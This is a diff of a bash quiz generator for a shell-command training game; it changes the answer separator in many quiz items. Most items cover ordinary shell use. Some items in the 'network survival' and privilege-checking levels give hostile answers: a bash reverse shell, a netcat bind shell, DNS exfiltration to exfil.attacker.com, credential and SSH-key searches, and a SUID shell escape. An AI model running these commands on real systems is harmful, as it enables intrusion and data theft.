@@ -893,12 +893,12 @@ gen_level2() {
 # Level 3: Basic Pipes (|)
 gen_level3() {
   local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
-  questions+=("List files and count them|ls | wc -l|#output:~^\\s*[0-9]+")
-  questions+=("Pipe ${W}server.log${C} through head to get first 5 lines|cat server.log | head -5|head -5 server.log|head -n 5 server.log|#output:@5")
-  questions+=("Search for ${Y}ERROR${C} in ${W}app.log${C}|grep ERROR app.log|cat app.log | grep ERROR|#output:~ERROR")
-  questions+=("Count matches of ${Y}INFO${C} in ${W}app.log${C}|grep -c INFO app.log|grep INFO app.log | wc -l|#output:~^\\s*[0-9]+")
-  questions+=("Sort ${W}notes.txt${C} alphabetically|sort notes.txt|cat notes.txt | sort|#output:*")
-  questions+=("Sort ${W}notes.txt${C} and remove duplicates|sort notes.txt | uniq|sort -u notes.txt|#output:*")
+  questions+=("List files and count them§ls | wc -l§#output:~^\\s*[0-9]+")
+  questions+=("Pipe ${W}server.log${C} through head to get first 5 lines§cat server.log | head -5§head -5 server.log§head -n 5 server.log§#output:@5")
+  questions+=("Search for ${Y}ERROR${C} in ${W}app.log${C}§grep ERROR app.log§cat app.log | grep ERROR§#output:~ERROR")
+  questions+=("Count matches of ${Y}INFO${C} in ${W}app.log${C}§grep -c INFO app.log§grep INFO app.log | wc -l§#output:~^\\s*[0-9]+")
+  questions+=("Sort ${W}notes.txt${C} alphabetically§sort notes.txt§cat notes.txt | sort§#output:*")
+  questions+=("Sort ${W}notes.txt${C} and remove duplicates§sort notes.txt | uniq§sort -u notes.txt§#output:*")
   printf '%s\n' "${questions[@]}"
 }
 
@@ -1105,9 +1105,9 @@ gen_level14() {
   questions+=("Match whole word '${term}' only|grep -rw ${term}|grep -wr ${term}|rg -w ${term}")
 
   # Multiple patterns
-  questions+=("Find lines with '${term}' OR '${term2}'|grep -rE '${term}|${term2}'|rg '${term}|${term2}'")
-  questions+=("Find lines with '${term}', '${term2}', OR '${term3}'|grep -rE '${term}|${term2}|${term3}'|rg '${term}|${term2}|${term3}'")
-  questions+=("Find lines with both '${term}' AND '${term2}'|grep -r ${term} | grep ${term2}|rg ${term} | rg ${term2}")
+  questions+=("Find lines with '${term}' OR '${term2}'§grep -rE '${term}|${term2}'§rg '${term}|${term2}'")
+  questions+=("Find lines with '${term}', '${term2}', OR '${term3}'§grep -rE '${term}|${term2}|${term3}'§rg '${term}|${term2}|${term3}'")
+  questions+=("Find lines with both '${term}' AND '${term2}'§grep -r ${term} | grep ${term2}§rg ${term} | rg ${term2}")
   questions+=("Search for pattern from file patterns.txt|grep -rf patterns.txt|rg -f patterns.txt")
 
   # Output control
@@ -1182,10 +1182,10 @@ gen_level16() {
   # Uniqueness - more variations
   questions+=("Remove adjacent duplicate lines|uniq ${txt}")
   questions+=("Count occurrences of each unique line|sort ${txt} | uniq -c")
-  questions+=("Show only duplicate lines|sort ${txt} | uniq -d")
-  questions+=("Show only unique lines (appear once)|sort ${txt} | uniq -u")
-  questions+=("Count unique lines in ${txt}|sort ${txt} | uniq | wc -l|sort -u ${txt} | wc -l")
-  questions+=("Show all duplicates (repeated lines)|sort ${txt} | uniq -D")
+  questions+=("Show only duplicate lines§sort ${txt} | uniq -d")
+  questions+=("Show only unique lines (appear once)§sort ${txt} | uniq -u")
+  questions+=("Count unique lines in ${txt}§sort ${txt} | uniq | wc -l§sort -u ${txt} | wc -l")
+  questions+=("Show all duplicates (repeated lines)§sort ${txt} | uniq -D")
 
   # Cutting columns - dynamic
   questions+=("Extract column ${col} from ${csv} (comma-delimited)|cut -d',' -f${col} ${csv}")
@@ -1225,27 +1225,27 @@ gen_level16() {
   questions+=("Transliterate characters|tr 'abc' 'xyz' < ${txt}")
 
   # Useful pipes - dynamic counts
-  questions+=("Top ${n} most common lines in ${log}|sort ${log} | uniq -c | sort -rn | head -${n}|sort ${log} | uniq -c | sort -nr | head -${n}")
-  questions+=("Count unique values in column ${col}|cut -d',' -f${col} ${csv} | sort | uniq -c")
-  questions+=("Extract and count unique IPs from ${log}|grep -oE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' ${log} | sort | uniq -c | sort -rn")
-  questions+=("Most common words in ${txt}|tr -s ' ' '\\n' < ${txt} | sort | uniq -c | sort -rn | head")
-  questions+=("Lines appearing in both ${txt} and ${txt2}|sort ${txt} ${txt2} | uniq -d|comm -12 <(sort ${txt}) <(sort ${txt2})")
+  questions+=("Top ${n} most common lines in ${log}§sort ${log} | uniq -c | sort -rn | head -${n}§sort ${log} | uniq -c | sort -nr | head -${n}")
+  questions+=("Count unique values in column ${col}§cut -d',' -f${col} ${csv} | sort | uniq -c")
+  questions+=("Extract and count unique IPs from ${log}§grep -oE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' ${log} | sort | uniq -c | sort -rn")
+  questions+=("Most common words in ${txt}§tr -s ' ' '\\n' < ${txt} | sort | uniq -c | sort -rn | head")
+  questions+=("Lines appearing in both ${txt} and ${txt2}§sort ${txt} ${txt2} | uniq -d§comm -12 <(sort ${txt}) <(sort ${txt2})")
   questions+=("Lines only in ${txt}, not ${txt2}|comm -23 <(sort ${txt}) <(sort ${txt2})")
 
   # Process management - with dynamic process names
   questions+=("List all processes|ps aux")
-  questions+=("$(_phrase "Find" "Show" "List") processes matching '${proc}'|ps aux | grep ${proc}|pgrep -a ${proc}")
+  questions+=("$(_phrase "Find" "Show" "List") processes matching '${proc}'§ps aux | grep ${proc}§pgrep -a ${proc}")
   questions+=("Get PID of ${proc}|pgrep ${proc}|pidof ${proc}")
   questions+=("Kill ${proc} process|pkill ${proc}")
   questions+=("Kill all processes matching '${proc}'|pkill -f ${proc}")
   questions+=("Kill ${proc} with SIGKILL|pkill -9 ${proc}|pkill -KILL ${proc}")
   questions+=("Show process tree|ps auxf|pstree")
   questions+=("Show process tree for ${proc}|pstree -p \$(pgrep ${proc})")
-  questions+=("Find what's using port ${port}|ss -tlpn | grep ${port}|lsof -i :${port}")
-  questions+=("List processes sorted by CPU usage|ps aux --sort=-%cpu | head")
-  questions+=("List processes sorted by memory usage|ps aux --sort=-%mem | head")
-  questions+=("Show top ${n} processes by memory|ps aux --sort=-%mem | head -${n}")
-  questions+=("Find zombie processes|ps aux | grep -w Z|ps aux | awk '\$8==\"Z\"'")
+  questions+=("Find what's using port ${port}§ss -tlpn | grep ${port}§lsof -i :${port}")
+  questions+=("List processes sorted by CPU usage§ps aux --sort=-%cpu | head")
+  questions+=("List processes sorted by memory usage§ps aux --sort=-%mem | head")
+  questions+=("Show top ${n} processes by memory§ps aux --sort=-%mem | head -${n}")
+  questions+=("Find zombie processes§ps aux | grep -w Z§ps aux | awk '\$8==\"Z\"'")
 
   # Modern network info (ip/ss)
   questions+=("$(_phrase "Show" "Display" "List") IP addresses|ip addr|ip a")
@@ -1298,14 +1298,14 @@ gen_level19() {
   questions+=("Append text after line ${linenum}|sed -i '${linenum}a\\appended text' ${txt}")
 
   # xargs - building commands from stdin
-  questions+=("Delete files listed in ${txt}|cat ${txt} | xargs rm|xargs rm < ${txt}")
-  questions+=("Run grep on files from find|find . -name '*.${ext}' | xargs grep ${term}")
-  questions+=("Process files with spaces in names|find . -name '*.${ext}' -print0 | xargs -0 wc -l")
-  questions+=("Run commands in parallel (${parallel} jobs)|find . -name '*.${ext}' | xargs -P ${parallel} -I {} process {}")
-  questions+=("Confirm before each delete|find . -name '*.${ext2}' | xargs -p rm")
-  questions+=("Limit xargs to ${n} arguments per command|cat ${txt} | xargs -n ${n} echo")
-  questions+=("Replace placeholder {} in command|cat ${txt} | xargs -I {} echo \"Processing {}\"")
-  questions+=("Show commands without executing (dry run)|cat ${txt} | xargs -t echo")
+  questions+=("Delete files listed in ${txt}§cat ${txt} | xargs rm§xargs rm < ${txt}")
+  questions+=("Run grep on files from find§find . -name '*.${ext}' | xargs grep ${term}")
+  questions+=("Process files with spaces in names§find . -name '*.${ext}' -print0 | xargs -0 wc -l")
+  questions+=("Run commands in parallel (${parallel} jobs)§find . -name '*.${ext}' | xargs -P ${parallel} -I {} process {}")
+  questions+=("Confirm before each delete§find . -name '*.${ext2}' | xargs -p rm")
+  questions+=("Limit xargs to ${n} arguments per command§cat ${txt} | xargs -n ${n} echo")
+  questions+=("Replace placeholder {} in command§cat ${txt} | xargs -I {} echo \"Processing {}\"")
+  questions+=("Show commands without executing (dry run)§cat ${txt} | xargs -t echo")
 
   # Combined operations
   questions+=("Find .${ext} files > ${size}, show sizes sorted|find . -name '*.${ext}' -size +${size} -exec du -h {} \\; | sort -rh")
@@ -1766,12 +1766,12 @@ gen_level28() {
   questions+=("Find large files (>100M) modified in 24h|find / -type f -size +100M -mtime -1 2>/dev/null")
   questions+=("Watch for new connections in realtime|watch -n1 'ss -tn state established'")
   questions+=("Monitor file changes in directory|inotifywait -m -r ${dir}/")
-  questions+=("Parallel compress all logs|find /var/log -name '*.log' | parallel gzip")
-  questions+=("Find duplicate files by hash|find . -type f -exec md5sum {} + | sort | uniq -d -w32")
-  questions+=("Extract all IPs from logs, count, sort|grep -rohE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' /var/log/* | sort | uniq -c | sort -rn | head")
+  questions+=("Parallel compress all logs§find /var/log -name '*.log' | parallel gzip")
+  questions+=("Find duplicate files by hash§find . -type f -exec md5sum {} + | sort | uniq -d -w32")
+  questions+=("Extract all IPs from logs, count, sort§grep -rohE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' /var/log/* | sort | uniq -c | sort -rn | head")
   questions+=("Find SUID binaries|find / -perm -4000 -type f 2>/dev/null")
   questions+=("Find world-writable files|find / -perm -o+w -type f 2>/dev/null")
-  questions+=("List all open ports and processes|ss -tlpn | awk 'NR>1 {print \$4, \$6}'")
+  questions+=("List all open ports and processes§ss -tlpn | awk 'NR>1 {print \$4, \$6}'")
 
   # === NETWORK SURVIVAL ===
   questions+=("Quick port scan without nmap|for p in {1..1000}; do timeout 0.1 bash -c \"echo >/dev/tcp/${ip}/\$p\" 2>/dev/null && echo \$p; done")
@@ -1780,7 +1780,7 @@ gen_level28() {
   questions+=("Reverse shell (bash)|bash -i >& /dev/tcp/${ip}/${port} 0>&1")
   questions+=("Create SSH tunnel and background|ssh -fNT -L ${port}:localhost:${port} ${user}@${host}")
   questions+=("Test if host is up (no ping)|timeout 1 bash -c \"echo >/dev/tcp/${ip}/22\" && echo up")
-  questions+=("Exfil file via DNS (base64)|cat ${txt} | base64 | xargs -I{} dig {}.exfil.attacker.com")
+  questions+=("Exfil file via DNS (base64)§cat ${txt} | base64 | xargs -I{} dig {}.exfil.attacker.com")
   questions+=("Bind shell with netcat|nc -lvnp ${port} -e /bin/bash")
   questions+=("Encrypted netcat with openssl|openssl s_server -quiet -key key.pem -cert cert.pem -port ${port}")
   questions+=("Pivot through host (proxychains setup)|ssh -D 9050 ${user}@${host} -fN && proxychains nmap ${ip}")
@@ -1788,12 +1788,12 @@ gen_level28() {
   # === SYSTEM FORENSICS ===
   questions+=("List all cron jobs system-wide|for u in \$(cut -f1 -d: /etc/passwd); do crontab -l -u \$u 2>/dev/null; done; cat /etc/crontab; ls /etc/cron.*")
   questions+=("Find files modified in last hour|find / -mmin -60 -type f 2>/dev/null")
-  questions+=("List all users with shell access|grep -v '/nologin\\|/false' /etc/passwd")
-  questions+=("Show failed login attempts|journalctl _COMM=sshd | grep -i 'failed\\|invalid'|grep 'Failed' /var/log/auth.log")
+  questions+=("List all users with shell access§grep -v '/nologin\\|/false' /etc/passwd")
+  questions+=("Show failed login attempts§journalctl _COMM=sshd | grep -i 'failed\\|invalid'§grep 'Failed' /var/log/auth.log")
   questions+=("Find hidden files in home dirs|find /home -name '.*' -type f 2>/dev/null")
   questions+=("Check for rootkits|chkrootkit|rkhunter --check")
   questions+=("Dump all environment variables|env; cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n'")
-  questions+=("Show all listening processes with full path|ss -tlpn | awk 'NR>1 {print \$6}' | sed 's/.*:\\([0-9]*\\).*/\\1/' | xargs -I{} lsof -i:{}")
+  questions+=("Show all listening processes with full path§ss -tlpn | awk 'NR>1 {print \$6}' | sed 's/.*:\\([0-9]*\\).*/\\1/' | xargs -I{} lsof -i:{}")
   questions+=("Find processes with deleted binaries|ls -la /proc/*/exe 2>/dev/null | grep deleted")
   questions+=("Memory dump of process|gcore -o dump \$(pgrep -f process)")
 
@@ -1807,17 +1807,17 @@ gen_level28() {
   questions+=("List all iptables rules|iptables -L -n -v")
   questions+=("List all nftables rules|nft list ruleset")
   questions+=("Audit failed sudo attempts|grep 'FAILED' /var/log/auth.log")
-  questions+=("Lock user account|passwd -l ${user}|usermod -L ${user}")
+  questions+=("Lock user account§passwd -l ${user}§usermod -L ${user}")
 
   # === PROCESS NINJA ===
-  questions+=("List processes by memory usage|ps aux --sort=-%mem | head")
-  questions+=("Find process by open file|lsof ${txt}|fuser ${txt}")
+  questions+=("List processes by memory usage§ps aux --sort=-%mem | head")
+  questions+=("Find process by open file§lsof ${txt}§fuser ${txt}")
   questions+=("Trace system calls of process|strace -p \$(pgrep -f process)")
   questions+=("Kill all processes by name|pkill -9 -f pattern")
   questions+=("Nice a running process|renice -n 10 -p PID")
 
   # === DISK SURVIVAL ===
-  questions+=("Find disk usage hogs|du -xh / 2>/dev/null | sort -rh | head -20")
+  questions+=("Find disk usage hogs§du -xh / 2>/dev/null | sort -rh | head -20")
   questions+=("Clear systemd journal logs|journalctl --vacuum-size=100M")
   questions+=("Sync and drop caches|sync; echo 3 > /proc/sys/vm/drop_caches")
   questions+=("Check disk health (SMART)|smartctl -a /dev/sda")
@@ -2043,7 +2043,7 @@ gen_level27() {
   questions+=("Show current user|whoami|id")
   questions+=("Show user groups|groups|id -Gn")
   questions+=("Show all users|cat /etc/passwd|getent passwd")
-  questions+=("Show users with shells|grep -v '/nologin\\|/false' /etc/passwd")
+  questions+=("Show users with shells§grep -v '/nologin\\|/false' /etc/passwd")
   questions+=("Show sudoers rules|sudo -l")
   questions+=("Check sudo version (CVE check)|sudo --version")
   questions+=("Show logged in users|who|w")
@@ -2069,7 +2069,7 @@ gen_level27() {
   questions+=("Find SSH keys|find / -name 'id_rsa*' -o -name '*.pem' 2>/dev/null")
   questions+=("Check environment variables|env|printenv")
   questions+=("Find files modified recently|find / -mmin -10 -type f 2>/dev/null")
-  questions+=("Search for credentials in files|grep -rli 'password\\|secret\\|key' /home 2>/dev/null")
+  questions+=("Search for credentials in files§grep -rli 'password\\|secret\\|key' /home 2>/dev/null")
 
   # GTFOBins-style exploits
   questions+=("SUID find shell escape|find . -exec /bin/sh -p \\; -quit")
@@ -2192,8 +2192,8 @@ gen_level20() {
   questions+=("Reverse fields|awk '{for(i=NF;i>0;i--) printf \"%s \",\$i; print \"\"}' ${txt}")
 
   # Combining tools
-  questions+=("Complex: extract, sort, count|grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' ${log} | sort | uniq -c | sort -rn")
-  questions+=("Complex: top N by frequency|awk '{print \$1}' ${log} | sort | uniq -c | sort -rn | head -${n}")
+  questions+=("Complex: extract, sort, count§grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' ${log} | sort | uniq -c | sort -rn")
+  questions+=("Complex: top N by frequency§awk '{print \$1}' ${log} | sort | uniq -c | sort -rn | head -${n}")
   questions+=("Complex: join lines with comma|paste -sd',' ${txt}")
   questions+=("Complex: transpose columns|awk '{for(i=1;i<=NF;i++) a[NR,i]=\$i} END{for(j=1;j<=NF;j++){for(i=1;i<=NR;i++) printf a[i,j]\" \"; print \"\"}}' ${txt}")
 
@@ -2233,8 +2233,8 @@ gen_level12() {
   questions+=("Show kernel messages|dmesg|dmesg -T")
   questions+=("Follow kernel messages|dmesg -w")
   questions+=("Interactive process viewer|top|htop|btop")
-  questions+=("Show top 10 memory-hungry processes|ps aux --sort=-%mem | head -11")
-  questions+=("Show top 10 CPU-hungry processes|ps aux --sort=-%cpu | head -11")
+  questions+=("Show top 10 memory-hungry processes§ps aux --sort=-%mem | head -11")
+  questions+=("Show top 10 CPU-hungry processes§ps aux --sort=-%cpu | head -11")
   questions+=("Show process tree|pstree|ps auxf")
 
   # Service management (systemd)
